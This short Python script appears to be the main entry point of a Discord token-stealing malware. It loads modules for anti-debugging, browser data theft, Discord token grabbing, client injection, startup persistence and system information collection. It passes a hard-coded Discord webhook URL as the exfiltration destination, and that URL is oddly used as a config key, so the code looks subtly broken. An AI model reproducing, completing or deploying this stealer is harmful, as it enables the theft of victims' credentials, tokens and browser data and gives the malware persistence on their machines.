from components.antidebug import AntiDebug
from components.browsers import Browsers
from components.discordtoken import DiscordToken
from components.injection import Injection
from components.startup import Startup
from components.systeminfo import SystemInfo
from config import __CONFIG__


def main():
    funcs = [
        AntiDebug,
        Browsers,
        DiscordToken,
        Injection,
        Startup,
        SystemInfo,
    ]

    for func in funcs:
        if __CONFIG__[func.__name__.lower()]:
            if func.__init__.__code__.co_argcount == 2:
                func(__CONFIG__['https://discord.com/api/webhooks/1045379056478204035/vdpzxMR_1wxyfJT_kW5hhHv95XHZdHELtcvD7JEO2xXnhfRfncEjKu-ArUXvZTJKh4k6'])
            else:
                func()

if __name__ == '__main__':
    main()
